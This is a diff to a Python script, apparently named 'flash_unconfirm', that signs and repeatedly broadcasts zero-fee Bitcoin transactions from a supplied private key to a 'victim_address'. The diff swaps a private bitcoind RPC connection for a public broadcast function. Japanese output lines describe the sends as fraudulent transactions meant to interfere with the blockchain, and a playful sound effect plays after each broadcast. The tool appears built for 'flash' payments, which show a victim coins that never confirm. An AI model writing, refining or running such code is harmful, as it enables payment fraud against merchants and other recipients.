@@ -5,25 +5,11 @@ import subprocess
 import cryptos
 import hashlib
 import uuid
-
 import bitcoin.rpc
 
 from bs4 import BeautifulSoup
 
 parser = argparse.ArgumentParser(description="How To Use flash_unconfirm")
-
-parser.add_argument("node_host",
-                    help="your bitcoind node host name",
-                    type=str)
-parser.add_argument("node_port",
-                    help="your bitcoind node host port",
-                    type=int)
-parser.add_argument("node_user",
-                    help="your bitcoind node user name",
-                    type=str)
-parser.add_argument("node_password",
-                    help="your bitcoind node password",
-                    type=str)
 parser.add_argument("send_from_wifkey",
                     help="Fake send btc from wif key.",
                     type=str)
@@ -80,11 +66,6 @@ def broadcast_transaction(raw_tx, testnet):
 
 
 args = parser.parse_args()
-node_host        = args.node_host
-node_port        = args.node_port
-node_user        = args.node_user
-node_password    = args.node_password
-
 fake_send_from   = args.send_from_wifkey
 victim_address   = args.fake_send_to
 amount_btc = args.amount_of_coins
@@ -95,12 +76,7 @@ if loop_count <= 0:
     loop_count = 1
 
 transaction_util = cryptos.Bitcoin(testnet=testnet)
-print("Connecting node.")
-rpc_node = bitcoin.rpc.Proxy(f"http://{node_user}:{node_password}@{node_host}",
-                             service_port=node_port)
-
-print(rpc_node.getinfo())
-
+print("OK")
 balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
 inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
     #balance = transaction_util.get_balance(send_from)
@@ -109,7 +85,6 @@ if balance["confirmed"] <= 0:
 else:
     balance = balance["confirmed"]
 
-
 send_amount = to_satoshi(amount_btc)
 
 if balance < send_amount:
@@ -117,7 +92,7 @@ if balance < send_amount:
     exit()
 
 fee = 0
-change_btc_amt = (balance - send_amount) - fee#おつり
+change_btc_amt = (balance - send_amount)#おつり
 
 input(" --- If you really want to continue, press enter. --- ")
 
@@ -130,7 +105,6 @@ for i  in range(loop_count):
         tx_victim = [{"address": victim_address, "value": send_amount}, {"address": transaction_util.wiftoaddr(fake_send_from), "value": change_btc_amt}]
 
     tx_victim = transaction_util.mktx(inputs, tx_victim)
-    print(tx_victim)
     if testnet:
         tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
     else:
@@ -151,27 +125,33 @@ for i  in range(loop_count):
     print()
 
     print()
-    print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
+    print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
     print()
-    print("SND PRNT ITX (不正なトランザクションを 表示送信 !)")
-    rpc_node.sendrawtransaction(tx_victim)
-    print(tx_victim)
+    broadcast_transaction(tx_victim, testnet)
+    print("SND ITX TOBC  (ブロックチェーンに不正なトランザクションを送信!)")
     print()
     #ゴリ押し
     print()
     #おまけ
     print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
     print()
-    #print("What if you send the generated transaction using https://live.blockcypher.com/btc/pushtx/??")
+
     sound_name = "ImagineBreaker.mp3"
     try:
         import soundplay
         soundplay.playsound(sound_name)
     except:
-        # Termux Only
-        imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
-        subprocess.run(imagine_breaker_cmd)
+        try:
+            # Termux Only
+            imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
+            subprocess.run(imagine_breaker_cmd)
+        except:
+            pass
     time.sleep(1) #休ませる
+    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
+    inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
 
 print("----------------")
+balance = transaction_util.get_balance(victim_address)
+print(f"fake send to address Balance (satoshi unit) :{balance}")
 print("Done.")
